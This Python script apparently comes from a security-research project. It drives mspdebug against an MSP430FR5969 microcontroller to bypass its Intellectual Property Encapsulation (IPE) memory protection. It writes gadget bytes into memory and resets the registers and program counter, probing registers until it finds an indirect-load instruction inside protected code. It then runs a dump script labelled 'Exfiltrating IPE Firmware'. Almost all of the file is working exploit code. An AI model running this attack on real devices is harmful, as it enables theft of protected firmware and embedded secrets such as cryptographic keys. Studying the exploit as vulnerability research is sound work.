import subprocess
from mspdebug_embedded_utils import *
import time
import os
import openpyxl

VERBOSE = True

#Select a benchmark
benchmark = "aes"
#benchmark = "rsa"
#benchmark = "sha-saddi"
#benchmark = "sha-gladman"

#reg_dump_size and reg_dump_sleep_time might differ for other opt levels,
#the current values are set for -O0 optimization level
#Change ~/RIPencapsulation with the path to where your ported_stuff directory is located
if(benchmark == "aes"):
    BINARY_NAME = "~/RIPencapsulation/ported_stuff/msp430fr5969/bin/aes-test.out"
    reg_dump_size = 200
    reg_dump_sleep_time = 5
elif(benchmark == "rsa"):
    BINARY_NAME = "~/RIPencapsulation/ported_stuff/msp430fr5969/bin/rsa-test.out"
    reg_dump_size = 400
    reg_dump_sleep_time = 5
elif(benchmark == "sha-saddi"):
    BINARY_NAME = "~/RIPencapsulation/ported_stuff/msp430fr5969/bin/sha-saddi-test.out"
    reg_dump_size = 700
    reg_dump_sleep_time = 10
elif(benchmark == "sha-gladman"):
    BINARY_NAME = "~/RIPencapsulation/ported_stuff/msp430fr5969/bin/sha-gladman-test.out"
    reg_dump_size = 5000
    reg_dump_sleep_time = 60

#Change ~/RIPencapsulation with the path to where your ported_stuff directory is located
os.system('dss.sh ~/RIPencapsulation/ported_stuff/eval/javascript/remove_ipe.js')

proc = mspdebugOpen()
waitForReady(proc, VERBOSE)
sendCmdWaitReady(proc, "prog " + BINARY_NAME, VERBOSE)

time.sleep(10)
subprocess.Popen(["python3","register_dump.py",str(reg_dump_size),"register_state_dump.xlsx"])
time.sleep(1)

sendCmdWaitBusy(proc, "run", VERBOSE)
time.sleep(reg_dump_sleep_time)
sendCmdWaitReady(proc, "\\break", VERBOSE)

subprocess.Popen(["python3","guess_indirect_loads.py", benchmark])
time.sleep(5)

sendCmdWaitReady(proc, "mw COMPARE_VALUE 0x1a", VERBOSE)
sendCmdWaitReady(proc, "mw COMPARE_VALUE+1 0x00", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget 0x40", VERBOSE)
sendCmdWaitReady(proc, "mw increment_timer_count 0x03", VERBOSE)
sendCmdWaitReady(proc, "mw increment_timer_count+1 0x43", VERBOSE)
sendCmdWaitReady(proc, "mw increment_timer_count+2 0x03", VERBOSE)
sendCmdWaitReady(proc, "mw increment_timer_count+3 0x43", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget 0x40", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+1 0x18", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+2 0x92", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+3 0x53", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+4 0x00", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+5 0xf0", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+7 0x42", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+8 0x00", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+9 0xf0", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+10 0x80", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+11 0x00", VERBOSE)
sendCmdWaitReady(proc, "mw IOP_gadget+11 0x00", VERBOSE)

# Define variable to load the dataframe
wb = openpyxl.load_workbook("../dumps/register_state_dump.xlsx")
 
# Define variable to read sheet
sheet = wb.worksheets[2]

indirect_load = 0

for row in range(1,sheet.max_row+1):

    branch_address = sheet.cell(row,1).value
    first_half = branch_address[0:2]
    second_half = branch_address[2:4]
    dest_reg = int(sheet.cell(row,2).value[1:]) + 1
    
    for reg_count in range(1,16):
        
        if(reg_count != 2):
            src_reg = str(format(reg_count, '02X'))
            src_reg = src_reg[1]
            sendCmdWaitReady(proc, "mw 0xf000 0xff", VERBOSE)
            sendCmdWaitReady(proc, "mw 0xf001 0xf0", VERBOSE)
            sendCmdWaitReady(proc, "mw 0xf100 0xef", VERBOSE)
            sendCmdWaitReady(proc, "mw 0xf101 0xbe", VERBOSE)
            sendCmdWaitReady(proc, "mw IOP_gadget+12 0x"+second_half, VERBOSE)
            sendCmdWaitReady(proc, "mw IOP_gadget+13 0x"+first_half, VERBOSE)
            sendCmdWaitReady(proc, "mw IOP_gadget+6 0x1"+src_reg, VERBOSE)
            sendCmdWaitReady(proc, "dis increment_timer_count", VERBOSE)
            sendCmdWaitReady(proc, "set SR 0x0003", VERBOSE)
            sendCmdWaitReady(proc, "set SP 0x23fc", VERBOSE)
            sendCmdWaitReady(proc, "set PC main", VERBOSE)
            subprocess.Popen(["python3","register_dump.py","2","indirect_load.xlsx"])
            time.sleep(0.5)               #increase delay if gibberish values dumped
            sendCmdWaitBusy(proc, "run", VERBOSE)
            sendCmdWaitReady(proc, "\\break", VERBOSE)
            wb1 = openpyxl.load_workbook("../dumps/indirect_load.xlsx")
            sheet1 = wb1.worksheets[0]
            if(sheet1.cell(1,dest_reg).value == "00EF" and sheet1.cell(2,dest_reg).value == "00BE"):
                indirect_load = 1
                break
            elif(sheet1.cell(1,dest_reg).value == "BEEF"):
                indirect_load = 2
                break
    
    if(indirect_load == 1 or indirect_load == 2):
        break
        
if(indirect_load == 1):
    print("")
    print("Indirect Load Found => 0"+branch_address+": MOV.B @R"+str(reg_count)+", R"+str(dest_reg-1))
    print("")
    sendCmdWaitReady(proc, "mw 0xf000 0xff", VERBOSE)
    sendCmdWaitReady(proc, "mw 0xf001 0x43", VERBOSE)
    sendCmdWaitReady(proc, "dis increment_timer_count", VERBOSE)
    sendCmdWaitReady(proc, "set SR 0x0003", VERBOSE)
    sendCmdWaitReady(proc, "set SP 0x23fc", VERBOSE)
    sendCmdWaitReady(proc, "set PC main", VERBOSE)
    print("\nExfiltrating IPE Firmware ...")
    subprocess.Popen(["python3","firmware_dump.py","8192",str(reg_count),str(dest_reg-1),"b"])
    time.sleep(1)
    sendCmdWaitBusy(proc, "run", VERBOSE)
elif(indirect_load == 2):
    print("")
    print("Indirect Load Found => 0"+branch_address+": MOV.W @R"+str(reg_count)+", R"+str(dest_reg-1))
    print("")
    sendCmdWaitReady(proc, "mw 0xf000 0xfe", VERBOSE)
    sendCmdWaitReady(proc, "mw 0xf001 0x43", VERBOSE)
    sendCmdWaitReady(proc, "mw IOP_gadget+2 0xa2", VERBOSE)
    sendCmdWaitReady(proc, "dis increment_timer_count", VERBOSE)
    sendCmdWaitReady(proc, "set SR 0x0003", VERBOSE)
    sendCmdWaitReady(proc, "set SP 0x23fc", VERBOSE)
    sendCmdWaitReady(proc, "set PC main", VERBOSE)
    print("\nExfiltrating IPE Firmware ...")
    subprocess.Popen(["python3","firmware_dump.py","4096",str(reg_count),str(dest_reg-1),"w"])
    time.sleep(1)
    sendCmdWaitBusy(proc, "run", VERBOSE)
else:
    print("")
    print("Unsuccessful: Could not find any indirect load instructions.")
    

            


